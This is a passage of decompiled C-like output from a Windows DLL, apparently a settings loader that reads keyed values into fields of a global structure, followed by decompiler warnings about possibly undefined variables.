    LOBYTE(v215) = 29;
    sub_1000728E(v207, v36);
    LOBYTE(v215) = 60;
    v37 = v207[0];
    if ( (*(unsigned __int8 (__thiscall **)(void *, void *))(*(_DWORD *)v207[0] + 96))(v207[0], &unk_1018659C) )
    {
      v38 = operator new(0x28u);
      v39 = v184;
      Block[0] = v38;
      LOBYTE(v215) = 61;
      if ( v38 )
      {
        v183 = v184;
        v213 = &v183;
        sub_1000D372(&v183, (int)&unk_1018659C);
        LOBYTE(v215) = 62;
        v182 = v40;
        v181 = v40;
        v212 = &v181;
        sub_1000A205(v207, &v181);
        LOBYTE(v215) = 61;
        v41 = sub_1000F1B1((int)Block[0], (int)v181, v182, (int)v183, (int)v184);
      }
      else
      {
        v41 = 0;
      }
      LOBYTE(v215) = 60;
      v184 = v39;
      v183 = v39;
      v213 = &v183;
      sub_1000D372(&v183, (int)&unk_1018677C);
      LOBYTE(v215) = 64;
      v212 = &v173;
      v172 = v42;
      v171 = (int *)v42;
      v211 = &v171;
      Block[0] = &v173;
      sub_1000728E(&v171, v41);
      LOBYTE(v215) = 64;
      sub_10010DB1((int)Block[0], (int)v171, v172);
      LOBYTE(v215) = 60;
      sub_100015E4(
        dword_101842F4 + 124,
        (int)v173,
        (int)v174,
        (int)v175,
        (int)v176,
        v177,
        (int)v178,
        (int)v179,
        (int)v180,
        (int)v181,
        (int)v182,
        (int)v183);
    }
    if ( (*(unsigned __int8 (__thiscall **)(void *, void *))(*(_DWORD *)v37 + 96))(v37, &unk_1018680C) )
    {
      v43 = operator new(0x28u);
      v44 = v183;
      Block[0] = v43;
      LOBYTE(v215) = 67;
      if ( v43 )
      {
        v182 = v183;
        v211 = &v182;
        sub_1000D372(&v182, (int)&unk_1018680C);
        LOBYTE(v215) = 68;
        v181 = v45;
        v180 = v45;
        v213 = &v180;
        sub_1000A205(v207, &v180);
        LOBYTE(v215) = 67;
        v46 = sub_1000F1B1((int)Block[0], (int)v180, v181, (int)v182, (int)v183);
      }
      else
      {
        v46 = 0;
      }
      LOBYTE(v215) = 60;
      v183 = v44;
      v182 = v44;
      v211 = &v182;
      sub_1000D372(&v182, (int)&unk_1018677C);
      LOBYTE(v215) = 70;
      v213 = &v172;
      v171 = v47;
      v170 = v47;
      v212 = &v170;
      sub_1000728E(&v170, v46);
      LOBYTE(v215) = 70;
      sub_10010DB1((int)&v172, (int)v170, v171);
      LOBYTE(v215) = 60;
      sub_100015E4(
        dword_101842F4 + 140,
        (int)v172,
        (int)v173,
        (int)v174,
        (int)v175,
        v176,
        (int)v177,
        (int)v178,
        (int)v179,
        (int)v180,
        (int)v181,
        (int)v182);
    }
    LOBYTE(v215) = 29;
    sub_10007D7A(v207);
  }
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 73;
  if ( Block[0] )
  {
    v182 = v183;
    v211 = &v182;
    sub_1000D372(&v182, (int)&unk_10186794);
    LOBYTE(v215) = 74;
    v181 = v48;
    v180 = v48;
    v213 = &v180;
    sub_1000A205(v206, &v180);
    LOBYTE(v215) = 73;
    v49 = sub_1000F1B1((int)Block[0], (int)v180, v181, (int)v182, (int)v183);
  }
  else
  {
    v49 = 0;
  }
  LOBYTE(v215) = 29;
  sub_1000728E(v207, v49);
  LOBYTE(v215) = 76;
  v50 = v207[0];
  *(_BYTE *)(dword_101842F4 + 160) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v207[0] + 60))(
                                       v207[0],
                                       &unk_101866DC);
  *(_BYTE *)(dword_101842F4 + 161) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v50 + 60))(v50, &unk_101866E4);
  v51 = operator new(0x28u);
  v52 = v181;
  Block[0] = v51;
  LOBYTE(v215) = 77;
  if ( v51 )
  {
    v180 = v181;
    v211 = &v180;
    sub_1000D372(&v180, (int)&unk_10186784);
    LOBYTE(v215) = 78;
    v179 = v53;
    v178 = v53;
    v213 = &v178;
    sub_1000A205(v207, &v178);
    LOBYTE(v215) = 77;
    v54 = sub_1000F1B1((int)Block[0], (int)v178, v179, (int)v180, (int)v181);
  }
  else
  {
    v54 = 0;
  }
  LOBYTE(v215) = 76;
  v181 = v52;
  v180 = v52;
  v211 = &v180;
  sub_1000D372(&v180, (int)&unk_1018669C);
  LOBYTE(v215) = 80;
  v213 = &v170;
  v169 = v55;
  v168 = v55;
  v212 = &v168;
  Block[0] = &v170;
  sub_1000728E(&v168, v54);
  LOBYTE(v215) = 80;
  sub_10010DB1((int)Block[0], (int)v168, v169);
  LOBYTE(v215) = 76;
  sub_100015E4(
    dword_101842F4 + 162,
    (int)v170,
    (int)v171,
    (int)v172,
    (int)v173,
    v174,
    (int)v175,
    (int)v176,
    (int)v177,
    (int)v178,
    (int)v179,
    (int)v180);
  *(_DWORD *)(dword_101842F4 + 178) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v50 + 72))(v50, &unk_10186614);
  *(_DWORD *)(dword_101842F4 + 214) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v50 + 72))(v50, &unk_101865E4);
  *(_DWORD *)(dword_101842F4 + 218) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v50 + 72))(v50, &unk_101867A4);
  v56 = operator new(0x28u);
  v57 = v178;
  Block[0] = v56;
  LOBYTE(v215) = 83;
  if ( v56 )
  {
    v177 = (int *)v178;
    v211 = &v177;
    sub_1000D372(&v177, (int)&unk_1018663C);
    LOBYTE(v215) = 84;
    v176 = v58;
    v175 = v58;
    v213 = &v175;
    sub_1000A205(v207, &v175);
    LOBYTE(v215) = 83;
    v59 = sub_1000F1B1((int)Block[0], (int)v175, v176, (int)v177, (int)v178);
  }
  else
  {
    v59 = 0;
  }
  LOBYTE(v215) = 76;
  v178 = v57;
  v177 = (int *)v57;
  v211 = &v177;
  sub_1000728E(&v177, v59);
  LOBYTE(v215) = 76;
  sub_10010DB1((int)v193, (int)v177, v178);
  LOBYTE(v215) = 87;
  for ( i = 0; ; i = (char *)i + 1 )
  {
    v60 = sub_10010EB7((_DWORD **)v193);
    if ( (unsigned int)i >= v60 )
      break;
    sub_100030C4(&v196);
    LOBYTE(v215) = 88;
    v61 = sub_10010EC5(v193, v202, i);
    LOBYTE(v215) = 89;
    v62 = (*(int (__thiscall **)(_DWORD, void **, void *))(*(_DWORD *)*v61 + 84))(*v61, v208, &unk_101865BC);
    LOBYTE(v215) = 90;
    sub_10001236((LONG *)(v62 + 4), v197);
    LOBYTE(v215) = 89;
    sub_1000D3AD((int *)v208);
    LOBYTE(v215) = 88;
    sub_10007D7A((void **)v202);
    v63 = sub_10010EC5(v193, v200, i);
    LOBYTE(v215) = 91;
    v64 = (*(int (__thiscall **)(_DWORD, void **, void *))(*(_DWORD *)*v63 + 84))(*v63, v201, &unk_1018671C);
    LOBYTE(v215) = 92;
    sub_10001236((LONG *)(v64 + 4), &v198);
    LOBYTE(v215) = 91;
    sub_1000D3AD((int *)v201);
    LOBYTE(v215) = 88;
    sub_10007D7A((void **)v200);
    v65 = operator new(0x28u);
    v66 = v174;
    Block[0] = v65;
    LOBYTE(v215) = 93;
    if ( v65 )
    {
      v173 = v174;
      v211 = &v173;
      sub_1000D372(&v173, (int)&unk_1018654C);
      LOBYTE(v215) = 94;
      v172 = v67;
      v171 = (int *)v67;
      v213 = &v171;
      sub_10010EC5(v193, &v171, i);
      LOBYTE(v215) = 93;
      v68 = sub_1000F1B1((int)Block[0], (int)v171, v172, (int)v173, (int)v174);
    }
    else
    {
      v68 = 0;
    }
    LOBYTE(v215) = 88;
    v174 = v66;
    v173 = v66;
    v211 = &v173;
    sub_1000D372(&v173, (int)&unk_101866D4);
    LOBYTE(v215) = 96;
    v213 = &v163;
    v162 = v69;
    v161 = v69;
    v212 = &v161;
    Block[0] = &v163;
    sub_1000728E(&v161, v68);
    LOBYTE(v215) = 96;
    sub_10010DB1((int)Block[0], (int)v161, v162);
    LOBYTE(v215) = 88;
    sub_100015E4(
      (int)v199,
      (int)v163,
      v164,
      (int)v165,
      (int)v166,
      v167,
      (int)v168,
      (int)v169,
      (int)v170,
      (int)v171,
      (int)v172,
      (int)v173);
    (*(void (__thiscall **)(int, int *))(*(_DWORD *)(dword_101842F4 + 182) + 36))(dword_101842F4 + 182, &v196);
    LOBYTE(v215) = 87;
    sub_10003111(&v196);
  }
  v70 = operator new(0x28u);
  v71 = v178;
  Block[0] = v70;
  LOBYTE(v215) = 99;
  if ( v70 )
  {
    v177 = (int *)v178;
    v211 = &v177;
    sub_1000D372(&v177, (int)&unk_101866AC);
    LOBYTE(v215) = 100;
    v176 = v72;
    v175 = v72;
    v213 = &v175;
    sub_1000A205(v207, &v175);
    LOBYTE(v215) = 99;
    v73 = sub_1000F1B1((int)Block[0], (int)v175, v176, (int)v177, (int)v178);
  }
  else
  {
    v73 = 0;
  }
  LOBYTE(v215) = 87;
  v178 = v71;
  v177 = (int *)v71;
  v211 = &v177;
  sub_1000D372(&v177, (int)&unk_101866B4);
  LOBYTE(v215) = 102;
  v213 = &v167;
  v166 = v74;
  v165 = v74;
  v212 = &v165;
  Block[0] = &v167;
  sub_1000728E(&v165, v73);
  LOBYTE(v215) = 102;
  sub_10010DB1((int)Block[0], (int)v165, v166);
  LOBYTE(v215) = 87;
  sub_100015E4(
    dword_101842F4 + 198,
    (int)v167,
    (int)v168,
    (int)v169,
    (int)v170,
    v171,
    (int)v172,
    (int)v173,
    (int)v174,
    (int)v175,
    (int)v176,
    (int)v177);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 105;
  if ( Block[0] )
  {
    v178 = v75;
    v177 = (int *)v75;
    v211 = &v177;
    sub_1000D372(&v177, (int)&unk_10186804);
    LOBYTE(v215) = 106;
    v176 = v76;
    v175 = v76;
    v213 = &v175;
    sub_1000A205(v206, &v175);
    LOBYTE(v215) = 105;
    v77 = sub_1000F1B1((int)Block[0], (int)v175, v176, (int)v177, (int)v178);
  }
  else
  {
    v77 = 0;
  }
  LOBYTE(v215) = 87;
  sub_1000728E(v208, v77);
  LOBYTE(v215) = 108;
  v78 = v208[0];
  *(_BYTE *)(dword_101842F4 + 367) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v208[0] + 60))(
                                       v208[0],
                                       &unk_10186694);
  *(_BYTE *)(dword_101842F4 + 368) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_10186724);
  *(_BYTE *)(dword_101842F4 + 369) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_1018651C);
  *(_BYTE *)(dword_101842F4 + 370) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_1018670C);
  *(_BYTE *)(dword_101842F4 + 371) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_101864EC);
  *(_BYTE *)(dword_101842F4 + 372) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_1018660C);
  *(_BYTE *)(dword_101842F4 + 373) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_101864E4);
  *(_BYTE *)(dword_101842F4 + 374) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v78 + 60))(v78, &unk_101867BC);
  v79 = operator new(0x28u);
  v80 = v170;
  Block[0] = v79;
  LOBYTE(v215) = 109;
  if ( v79 )
  {
    v169 = v170;
    v211 = &v169;
    sub_1000D372(&v169, (int)&unk_101867FC);
    LOBYTE(v215) = 110;
    v168 = v81;
    v167 = (int *)v81;
    v213 = &v167;
    sub_1000A205(v208, &v167);
    LOBYTE(v215) = 109;
    v82 = sub_1000F1B1((int)Block[0], (int)v167, v168, (int)v169, (int)v170);
  }
  else
  {
    v82 = 0;
  }
  LOBYTE(v215) = 108;
  v170 = v80;
  v169 = v80;
  v211 = &v169;
  sub_1000D372(&v169, (int)&unk_10186524);
  LOBYTE(v215) = 112;
  v213 = &v159;
  v158 = v83;
  v157 = v83;
  v212 = &v157;
  Block[0] = &v159;
  sub_1000728E(&v157, v82);
  LOBYTE(v215) = 112;
  sub_10010DB1((int)Block[0], (int)v157, v158);
  LOBYTE(v215) = 108;
  sub_100015E4(
    dword_101842F4 + 375,
    (int)v159,
    (int)v160,
    (int)v161,
    (int)v162,
    v163,
    v164,
    (int)v165,
    (int)v166,
    (int)v167,
    (int)v168,
    (int)v169);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 115;
  if ( Block[0] )
  {
    v170 = v84;
    v169 = v84;
    v211 = &v169;
    sub_1000D372(&v169, (int)&unk_10186584);
    LOBYTE(v215) = 116;
    v168 = v85;
    v167 = (int *)v85;
    v213 = &v167;
    sub_1000A205(v206, &v167);
    LOBYTE(v215) = 115;
    v86 = sub_1000F1B1((int)Block[0], (int)v167, v168, (int)v169, (int)v170);
  }
  else
  {
    v86 = 0;
  }
  LOBYTE(v215) = 108;
  sub_1000728E(v202, v86);
  LOBYTE(v215) = 118;
  v87 = v202[0];
  *(_BYTE *)(dword_101842F4 + 311) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v202[0] + 60))(
                                       v202[0],
                                       &unk_1018662C);
  *(_BYTE *)(dword_101842F4 + 313) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_101865F4);
  *(_BYTE *)(dword_101842F4 + 314) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_10186814);
  *(_BYTE *)(dword_101842F4 + 315) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_101866C4);
  *(_BYTE *)(dword_101842F4 + 316) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_10186704);
  *(_BYTE *)(dword_101842F4 + 317) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_1018672C);
  *(_BYTE *)(dword_101842F4 + 318) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_10186594);
  *(_BYTE *)(dword_101842F4 + 319) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_101867CC);
  *(_BYTE *)(dword_101842F4 + 320) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v87 + 60))(v87, &unk_10186564);
  v88 = operator new(0x28u);
  v89 = (int)v161;
  Block[0] = v88;
  LOBYTE(v215) = 119;
  if ( v88 )
  {
    v160 = v161;
    v211 = &v160;
    sub_1000D372(&v160, (int)&unk_1018665C);
    LOBYTE(v215) = 120;
    v159 = v90;
    v158 = v90;
    v213 = &v158;
    sub_1000A205(v202, &v158);
    LOBYTE(v215) = 119;
    v91 = sub_1000F1B1((int)Block[0], (int)v158, v159, (int)v160, (int)v161);
  }
  else
  {
    v91 = 0;
  }
  LOBYTE(v215) = 118;
  v161 = (volatile LONG *)v89;
  v160 = (volatile LONG *)v89;
  v211 = &v160;
  sub_1000D372(&v160, (int)&unk_10186514);
  LOBYTE(v215) = 122;
  v213 = &v150;
  v149 = v92;
  v148 = v92;
  v212 = &v148;
  Block[0] = &v150;
  sub_1000728E(&v148, v91);
  LOBYTE(v215) = 122;
  sub_10010DB1((int)Block[0], (int)v148, v149);
  LOBYTE(v215) = 118;
  sub_100015E4(
    dword_101842F4 + 321,
    (int)v150,
    v151,
    v152,
    v153,
    v154,
    (int)v155,
    (int)v156,
    (int)v157,
    (int)v158,
    (int)v159,
    (int)v160);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = 125;
  if ( Block[0] )
  {
    v161 = (volatile LONG *)v93;
    v160 = (volatile LONG *)v93;
    v211 = &v160;
    sub_1000D372(&v160, (int)&unk_10186544);
    LOBYTE(v215) = 126;
    v159 = v94;
    v158 = v94;
    v213 = &v158;
    sub_1000A205(v206, &v158);
    LOBYTE(v215) = 125;
    v95 = sub_1000F1B1((int)Block[0], (int)v158, v159, (int)v160, (int)v161);
  }
  else
  {
    v95 = 0;
  }
  LOBYTE(v215) = 118;
  sub_1000728E(v201, v95);
  LOBYTE(v215) = 0x80;
  v96 = v201[0];
  *(_DWORD *)(dword_101842F4 + 337) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v201[0] + 72))(
                                        v201[0],
                                        &unk_101865A4);
  v204 = 0;
  v205 = 0;
  v97 = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v96 + 72))(v96, &unk_101864FC);
  v205 = v97;
  v204 = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v96 + 72))(v96, &unk_101866A4);
  v98 = dword_101842F4;
  *(_DWORD *)(dword_101842F4 + 341) = v204;
  *(_DWORD *)(v98 + 345) = v97;
  *(_BYTE *)(dword_101842F4 + 349) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v96 + 60))(v96, &unk_101866F4);
  v99 = operator new(0x28u);
  v100 = (int)v157;
  Block[0] = v99;
  LOBYTE(v215) = -127;
  if ( v99 )
  {
    v156 = v157;
    v211 = &v156;
    sub_1000D372(&v156, (int)&unk_101867E4);
    LOBYTE(v215) = -126;
    v155 = v101;
    v154 = (int *)v101;
    v213 = &v154;
    sub_1000A205(v201, &v154);
    LOBYTE(v215) = -127;
    v102 = sub_1000F1B1((int)Block[0], (int)v154, v155, (int)v156, (int)v157);
  }
  else
  {
    v102 = 0;
  }
  LOBYTE(v215) = 0x80;
  v157 = (volatile LONG *)v100;
  v156 = (volatile LONG *)v100;
  v211 = &v156;
  sub_1000D372(&v156, (int)&unk_10186644);
  LOBYTE(v215) = -124;
  v213 = &v146;
  v145 = v103;
  v144 = v103;
  v212 = &v144;
  Block[0] = &v146;
  sub_1000728E(&v144, v102);
  LOBYTE(v215) = -124;
  sub_10010DB1((int)Block[0], (int)v144, v145);
  LOBYTE(v215) = 0x80;
  sub_100015E4(
    dword_101842F4 + 350,
    v146,
    v147,
    (int)v148,
    (int)v149,
    v150,
    v151,
    v152,
    v153,
    (int)v154,
    (int)v155,
    (int)v156);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = -121;
  if ( Block[0] )
  {
    v157 = (volatile LONG *)v104;
    v156 = (volatile LONG *)v104;
    v211 = &v156;
    sub_1000D372(&v156, (int)&unk_10186624);
    LOBYTE(v215) = -120;
    v155 = v105;
    v154 = (int *)v105;
    v213 = &v154;
    sub_1000A205(v206, &v154);
    LOBYTE(v215) = -121;
    v106 = sub_1000F1B1((int)Block[0], (int)v154, v155, (int)v156, (int)v157);
  }
  else
  {
    v106 = 0;
  }
  LOBYTE(v215) = 0x80;
  sub_1000728E(v200, v106);
  LOBYTE(v215) = -118;
  v107 = v200[0];
  *(_BYTE *)(dword_101842F4 + 222) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v200[0] + 60))(
                                       v200[0],
                                       &unk_10186754);
  *(_BYTE *)(dword_101842F4 + 223) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v107 + 60))(v107, &unk_10186764);
  *(_BYTE *)(dword_101842F4 + 224) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v107 + 60))(v107, &unk_101867D4);
  *(_BYTE *)(dword_101842F4 + 225) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v107 + 60))(v107, &unk_101865D4);
  *(_BYTE *)(dword_101842F4 + 226) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v107 + 60))(v107, &unk_10186664);
  v108 = operator new(0x28u);
  v109 = v152;
  Block[0] = v108;
  LOBYTE(v215) = -117;
  if ( v108 )
  {
    v151 = v152;
    v211 = &v151;
    sub_1000D372(&v151, (int)&unk_10186684);
    LOBYTE(v215) = -116;
    v150 = v110;
    v149 = v110;
    v213 = &v149;
    sub_1000A205(v200, &v149);
    LOBYTE(v215) = -117;
    v111 = sub_1000F1B1((int)Block[0], (int)v149, v150, v151, v152);
  }
  else
  {
    v111 = 0;
  }
  LOBYTE(v215) = -118;
  v152 = v109;
  v151 = v109;
  v211 = &v151;
  sub_1000D372(&v151, (int)&unk_101866CC);
  LOBYTE(v215) = -114;
  v213 = &v141;
  v140 = v112;
  v139 = v112;
  v212 = &v139;
  Block[0] = &v141;
  sub_1000728E(&v139, v111);
  LOBYTE(v215) = -114;
  sub_10010DB1((int)Block[0], (int)v139, v140);
  LOBYTE(v215) = -118;
  sub_100015E4(
    dword_101842F4 + 227,
    v141,
    (int)v142,
    (int)v143,
    (int)v144,
    v145,
    v146,
    v147,
    (int)v148,
    (int)v149,
    (int)v150,
    v151);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = -111;
  if ( Block[0] )
  {
    v152 = v113;
    v151 = v113;
    v211 = &v151;
    sub_1000D372(&v151, (int)&unk_1018666C);
    LOBYTE(v215) = -110;
    v150 = v114;
    v149 = v114;
    v213 = &v149;
    sub_1000A205(v206, &v149);
    LOBYTE(v215) = -111;
    v115 = sub_1000F1B1((int)Block[0], (int)v149, v150, v151, v152);
  }
  else
  {
    v115 = 0;
  }
  LOBYTE(v215) = -118;
  sub_1000728E(&v204, v115);
  LOBYTE(v215) = -108;
  v198 = 0;
  memset(v199, 0, 13);
  v116 = (void *)v204;
  *(int *)((char *)&v199[1] + 1) = (*(int (__thiscall **)(int, void *))(*(_DWORD *)v204 + 72))(v204, &unk_10186604);
  LOBYTE(v199[1]) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v116 + 60))(v116, &unk_1018673C);
  v198 = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v116 + 72))(v116, &unk_101865AC);
  v199[0] = 0;
  if ( !LOBYTE(v199[1]) )
    v199[0] = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v116 + 72))(v116, &unk_101867EC);
  *(int *)((char *)&v199[2] + 1) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v116 + 72))(v116, &unk_1018655C);
  v117 = dword_101842F4 + 243;
  *(_DWORD *)(dword_101842F4 + 243) = v198;
  v117 += 4;
  *(_DWORD *)v117 = v199[0];
  v117 += 4;
  *(_DWORD *)v117 = v199[1];
  v117 += 4;
  *(_DWORD *)v117 = v199[2];
  *(_BYTE *)(v117 + 4) = v199[3];
  *(_DWORD *)(dword_101842F4 + 260) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v116 + 72))(
                                        v116,
                                        &unk_1018668C);
  *(_DWORD *)(dword_101842F4 + 264) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v116 + 72))(
                                        v116,
                                        &unk_101865B4);
  v118 = operator new(0x28u);
  v119 = v145;
  Block[0] = v118;
  LOBYTE(v215) = -107;
  if ( v118 )
  {
    v144 = v145;
    v211 = &v144;
    sub_1000D372(&v144, (int)&unk_1018676C);
    LOBYTE(v215) = -106;
    v143 = v120;
    v142 = v120;
    v213 = &v142;
    sub_1000A205(&v204, &v142);
    LOBYTE(v215) = -107;
    v121 = sub_1000F1B1((int)Block[0], (int)v142, v143, (int)v144, (int)v145);
  }
  else
  {
    v121 = 0;
  }
  LOBYTE(v215) = -108;
  v145 = v119;
  v144 = v119;
  v211 = &v144;
  sub_1000D372(&v144, (int)&unk_1018675C);
  LOBYTE(v215) = -104;
  v213 = &v134;
  v133 = v122;
  v132 = v122;
  v212 = &v132;
  Block[0] = &v134;
  sub_1000728E(&v132, v121);
  LOBYTE(v215) = -104;
  sub_10010DB1((int)Block[0], (int)v132, v133);
  LOBYTE(v215) = -108;
  sub_100015E4(
    dword_101842F4 + 268,
    v134,
    v135,
    v136,
    v137,
    v138,
    (int)v139,
    (int)v140,
    v141,
    (int)v142,
    (int)v143,
    (int)v144);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = -101;
  if ( Block[0] )
  {
    v145 = v123;
    v144 = v123;
    v211 = &v144;
    sub_1000D372(&v144, (int)&unk_101865CC);
    LOBYTE(v215) = -100;
    v143 = v124;
    v142 = v124;
    v213 = &v142;
    sub_1000A205(&v204, &v142);
    LOBYTE(v215) = -101;
    v125 = sub_1000F1B1((int)Block[0], (int)v142, v143, (int)v144, (int)v145);
  }
  else
  {
    v125 = 0;
  }
  LOBYTE(v215) = -108;
  v145 = v123;
  v144 = v123;
  v211 = &v144;
  sub_1000D372(&v144, (int)&unk_1018675C);
  LOBYTE(v215) = -98;
  v213 = &v134;
  v133 = v126;
  v132 = v126;
  v212 = &v132;
  sub_1000728E(&v132, v125);
  LOBYTE(v215) = -98;
  sub_10010DB1((int)&v134, (int)v132, v133);
  LOBYTE(v215) = -108;
  sub_100015E4(
    dword_101842F4 + 284,
    v134,
    v135,
    v136,
    v137,
    v138,
    (int)v139,
    (int)v140,
    v141,
    (int)v142,
    (int)v143,
    (int)v144);
  Block[0] = operator new(0x28u);
  LOBYTE(v215) = -95;
  if ( Block[0] )
  {
    v145 = v127;
    v144 = v127;
    v211 = &v144;
    sub_1000D372(&v144, (int)&unk_101865FC);
    LOBYTE(v215) = -94;
    v143 = v128;
    v142 = v128;
    v213 = &v142;
    sub_1000A205(v206, &v142);
    LOBYTE(v215) = -95;
    v129 = sub_1000F1B1((int)Block[0], (int)v142, v143, (int)v144, (int)v145);
  }
  else
  {
    v129 = 0;
  }
  LOBYTE(v215) = -108;
  sub_1000728E(&v210, v129);
  LOBYTE(v215) = -92;
  v130 = v210;
  *(_BYTE *)(dword_101842F4 + 300) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v210 + 60))(v210, &unk_10186744);
  *(_BYTE *)(dword_101842F4 + 301) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_1018674C);
  *(_BYTE *)(dword_101842F4 + 302) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_10186534);
  *(_BYTE *)(dword_101842F4 + 303) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_101865EC);
  *(_BYTE *)(dword_101842F4 + 304) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_1018661C);
  *(_BYTE *)(dword_101842F4 + 307) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_101864DC);
  *(_BYTE *)(dword_101842F4 + 308) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_101867DC);
  *(_BYTE *)(dword_101842F4 + 305) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_10186674);
  *(_BYTE *)(dword_101842F4 + 306) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_1018657C);
  *(_BYTE *)(dword_101842F4 + 309) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_10186714);
  *(_BYTE *)(dword_101842F4 + 310) = (*(int (__thiscall **)(void *, void *))(*(_DWORD *)v130 + 60))(v130, &unk_10186504);
  LOBYTE(v215) = -108;
  sub_10007D7A(&v210);
  LOBYTE(v215) = -118;
  sub_10007D7A((void **)&v204);
  LOBYTE(v215) = 0x80;
  sub_10007D7A((void **)v200);
  LOBYTE(v215) = 118;
  sub_10007D7A(v201);
  LOBYTE(v215) = 108;
  sub_10007D7A((void **)v202);
  LOBYTE(v215) = 87;
  sub_10007D7A(v208);
  LOBYTE(v215) = 76;
  sub_100016A1((int)v193);
  LOBYTE(v215) = 29;
  sub_10007D7A(v207);
  LOBYTE(v215) = 25;
  sub_10007D7A(v203);
  LOBYTE(v215) = 23;
  sub_10007D7A(v206);
  LOBYTE(v215) = 22;
  sub_100078A2((void **)v195);
  LOBYTE(v215) = 21;
  sub_1000308F((int)v192);
  v215 = -1;
  sub_1000B3DF(v194);
  return 1;
}
// 10001984: variable 'v5' is possibly undefined
// 10001BA4: variable 'v19' is possibly undefined
// 10001BCD: variable 'v18' is possibly undefined
// 10001BEB: variable 'v21' is possibly undefined
// 10001C48: variable 'v24' is possibly undefined
// 10001C71: variable 'v23' is possibly undefined
// 10001C8F: variable 'v26' is possibly undefined
// 10001CD5: variable 'v27' is possibly undefined
// 10001CEB: variable 'v28' is possibly undefined
// 10001D32: variable 'v30' is possibly undefined
// 10001D78: variable 'v31' is possibly undefined
// 10001D8E: variable 'v32' is possibly undefined
// 10001DD5: variable 'v34' is possibly undefined
// 10001E44: variable 'v35' is possibly undefined
// 10001EB5: variable 'v40' is possibly undefined
// 10001EDE: variable 'v39' is possibly undefined
// 10001EFC: variable 'v42' is possibly undefined
// 10001F70: variable 'v45' is possibly undefined
// 10001F99: variable 'v44' is possibly undefined
// 10001FB7: variable 'v47' is possibly undefined
// 10002023: variable 'v48' is possibly undefined
// 100020B3: variable 'v53' is possibly undefined
// 100020DB: variable 'v52' is possibly undefined
// 100020F9: variable 'v55' is possibly undefined
// 100021A7: variable 'v58' is possibly undefined
// 100021CE: variable 'v57' is possibly undefined
// 100022E2: variable 'v67' is possibly undefined
// 10002312: variable 'v66' is possibly undefined
// 10002330: variable 'v69' is possibly undefined
// 100023BB: variable 'v72' is possibly undefined
// 100023E4: variable 'v71' is possibly undefined
// 10002402: variable 'v74' is possibly undefined
// 10002450: variable 'v75' is possibly undefined
// 10002466: variable 'v76' is possibly undefined
// 10002585: variable 'v81' is possibly undefined
// 100025AE: variable 'v80' is possibly undefined
// 100025CC: variable 'v83' is possibly undefined
// 1000261A: variable 'v84' is possibly undefined
// 10002630: variable 'v85' is possibly undefined
// 10002767: variable 'v90' is possibly undefined
// 10002790: variable 'v89' is possibly undefined
// 100027AE: variable 'v92' is possibly undefined
// 100027FC: variable 'v93' is possibly undefined
// 10002812: variable 'v94' is possibly undefined
// 100028DD: variable 'v101' is possibly undefined
// 10002906: variable 'v100' is possibly undefined
// 10002924: variable 'v103' is possibly undefined
// 10002972: variable 'v104' is possibly undefined
// 10002988: variable 'v105' is possibly undefined
